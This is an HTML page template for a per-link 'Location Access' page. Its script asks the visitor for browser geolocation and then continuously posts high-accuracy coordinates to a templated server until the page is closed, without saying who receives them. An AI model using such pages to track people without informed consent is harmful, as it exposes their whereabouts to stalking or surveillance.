<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Permission</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: #e0e0f0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: #1a1a2e;
      border: 1px solid #2a2a4a;
      border-radius: 16px;
      padding: 40px 36px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
    }
    .icon { font-size: 56px; margin-bottom: 20px; }
    h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
    p { font-size: 14px; color: #9090b0; line-height: 1.6; margin-bottom: 28px; }
    #status { margin-top: 18px; font-size: 13px; min-height: 20px; }
    .success { color: #4caf50; }
    .error   { color: #f44336; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">📍</div>
    <h2>Location Access</h2>
    <p>Please allow location access when prompted by your browser.</p>
    <div id="status">⏳ Requesting location access...</div>
  </div>

  <script>
    const code = '{{code}}';
    const server = '{{server}}';
    {% if not valid %}
    document.getElementById('status').textContent = '❌ Invalid link';
    document.getElementById('status').className = 'error';
    {% else %}
    (async function() {
      const status = document.getElementById('status');
      try {
        status.textContent = '⏳ Location permission requested...';
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
        });
        status.textContent = '✅ Location active — tracking continuously...';
        status.className = 'success';

        // Send initial location
        fetch(server + '/api/location/' + code, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy, timestamp: new Date().toISOString() })
        }).catch(() => {});

        // Continuous watch — keeps sending until page is closed
        const wid = navigator.geolocation.watchPosition(p => {
          fetch(server + '/api/location/' + code, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, timestamp: new Date().toISOString() })
          }).catch(() => {});
        }, () => {}, { enableHighAccuracy: true });

        // Cleanup on page close
        window.addEventListener('beforeunload', function() {
          navigator.geolocation.clearWatch(wid);
        });
      } catch (err) {
        status.textContent = '❌ Location access denied: ' + err.message;
        status.className = 'error';
      }
    })();
    {% endif %}
  </script>
</body>
</html>
